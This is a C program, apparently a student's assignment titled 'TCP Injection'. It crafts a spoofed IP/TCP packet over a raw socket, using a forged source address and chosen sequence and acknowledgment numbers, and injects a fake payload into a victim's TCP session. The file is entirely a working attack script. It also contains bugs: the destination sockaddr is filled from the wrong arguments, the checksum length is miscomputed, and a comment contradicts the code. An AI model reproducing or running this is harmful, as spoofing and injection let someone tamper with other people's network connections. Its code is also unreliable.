//Attack 3: TCP Injection

//Mitchell Newell 
//UCID: 30006529

// Run as root, just datagram no data/payload

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// Packet length
#define PCKT_LEN 4096

//Created and used for TCP checksum calculation
struct checksum_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};

//  Checksum function
unsigned short checksum(unsigned short *buf, int len)
{
    register long sum = 0;
    unsigned short oddbyte;

    while(len>1) {
        sum+=*buf++;
        len-=2;
    }
    if(len==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)buf;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    return (unsigned short)~sum;
}

 
int main(int argc, char *argv[]) {

    if(argc != 7) {
        printf("Incorrect usage\n");
        printf("<source hostname/IP> <source port> <target hostname/IP> <target port> <TCP seq Number> <TCP Ack Number> \n");
        exit(-1);
    }
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        perror("socket() error");
        exit(-1);
    } else {
        printf("socket()-SOCK_RAW and tcp protocol is OK.\n");
    }

    char datagram[PCKT_LEN];
    memset(datagram, 0, PCKT_LEN);

    // Fake reply payload
    unsigned char spoofData[] = "H31L0, W0r1D";
    unsigned short spoofData_Len = strlen(spoofData);

    // The size of the headers
    struct iphdr *ip = (struct iphdr *) datagram;
    struct tcphdr *tcp = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in din;
    struct checksum_header cs;

    int spoofSeq = atoi(argv[5]);
    int spoofAck = atoi(argv[6]);

    int one = 1;
    const int *val = &one;

    // Address family
    din.sin_family = AF_INET;
    // Source Port (to spoof) obtained through the command line 
    din.sin_port = htons(atoi(argv[5]));
    // Source IP (to spoof) obtained through the command line 
    din.sin_addr.s_addr = inet_addr(argv[4]);

    // IP structure
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(spoofData);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP; // TCP
    ip->check = 0;
    // Source IP (to spoof) obtained through the command line 
    ip->saddr = inet_addr(argv[1]);
    // Destination IP obtained through the command line 
    ip->daddr = inet_addr(argv[3]);

    // The TCP structure 
    //The source port (to spoof) obtained through the command line
    tcp->source = htons(atoi(argv[2]));
    // The destination port obtained through the command line 
    tcp->dest = htons(atoi(argv[4]));
    tcp->seq = htonl(spoofSeq);
    tcp->ack_seq = htonl(spoofAck);
    tcp->doff = sizeof(struct tcphdr) / 4;
    tcp->fin = 0;      
    tcp->syn = 0;      
    tcp->rst = 0;      
    tcp->psh = 1;      
    tcp->ack = 1;      
    tcp->urg = 0;     
    tcp->window = htons(5840);
    tcp->th_sum = 0;
    tcp->urg_ptr = 0;

    // Fill in checksum
    cs.source_address = inet_addr( argv[1] );
    cs.dest_address = inet_addr( argv[3] );
    cs.placeholder = 0;
    cs.protocol = IPPROTO_TCP;
    cs.tcp_length = htons(sizeof(struct tcphdr) + spoofData_Len);

    memcpy(&cs.tcp , tcp , sizeof (struct tcphdr));
    tcp->th_sum = checksum( (unsigned short*) &cs , 12 + sizeof (tcp));
    memcpy((datagram + sizeof(struct iphdr) + sizeof(struct tcphdr)), spoofData, spoofData_Len * sizeof(uint8_t));

    //Tell the kernel we created and filled our own headers so it doesn't try to fill
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("error using setsockopt()");
        exit(-1);
    } else {
        printf("setsockopt() is successful\n");
    }

    printf("Using: Source IP: %s port: %u, Target IP: %s port: %u, Spoof Seq: %u, Spoof Ack: %u\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]), atoi(argv[5]), atoi(argv[6]));

    if(sendto(s, datagram, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0) {
        perror("error trying to use sendto()");
        exit(-1);
    } else {
        printf(" sendto() successful\n");
    }
    return 0;
}